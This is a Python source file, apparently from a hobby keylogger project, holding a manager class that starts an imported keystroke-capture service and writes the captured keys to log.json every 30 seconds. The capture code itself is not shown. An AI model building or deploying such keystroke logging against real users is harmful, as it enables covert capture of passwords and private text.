import time
from KeyloggerService import KeyLoggerService, Logger
from KeyloggerAgent.FileWrite import FileWriter


class KeyLoggerManager(Logger):

    def __init__(self):
        self.service = KeyLoggerService()
        self.writer = FileWriter()

    def start_listening(self):
        """
        Starts listening and sends the values
        to be written to a json file
        """
        self.service.start_listening()
        print("Keylogger is starting! Press ctrl+c to stop!")
        while True:
            time.sleep(30)
            self._write_to_file(self.service.get_data(),'log.json')
    def stop_listening(self):
        """
         Stops listening to keyboard keys
        :return:
        """
        self.service.stop_listening()

    def _write_to_file(self,data:dict, file_name:str):
        """
        Writes text to a json file
        """
        self.writer.write(data ,file_name)

